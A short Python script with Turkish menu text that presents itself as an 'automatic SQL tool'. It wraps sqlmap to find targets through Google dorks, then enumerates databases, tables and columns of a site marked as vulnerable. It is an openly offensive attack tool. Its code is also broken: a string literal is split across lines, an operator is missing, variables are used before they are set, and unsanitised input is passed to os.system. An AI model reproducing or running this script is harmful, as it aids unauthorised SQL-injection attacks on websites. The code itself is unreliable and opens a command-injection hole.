import os
os.system("clear")
print("Otomatik Sql Aracı")
print("Not:Sqlmap kullanmaktadır.")
print("""
[1]Dork Tara
[2]Açıklı Link Biliyorum
[3]Veri Tabanını Biliyorum
[4]Kolonları Biliyorum
""")
gorev = input("Görev Seçin: ")
if(gorev=="1"):
	os.system("clear")
	dork=input("Dork Giriniz: ")
	os.system("sqlmap -g"+dork)
elif(gorev=="2"):
	print("islem2")
	os.system("clear")
	aciklink = input("Açıklı Link: ")
	os.system("sqlmap -u"+aciklink+"--dbs
	")
elif(gorev=="3"):
	os.system("clear")
	veritabaniadi = input("Veritabanı Giriniz: ")
	os.system("sqlmap -u"+aciklink+"-D"+veritabaniadi+"--tables")
elif(gorev=="4"):
	os.system("clear")
	kolon = input("Kolon Giriniz: ")
	os.system("sqlmap -u"+aciklink+"-D"+veritabaniadi+"--tables"+kolon"--columns")
else:
	print("Hata...")
	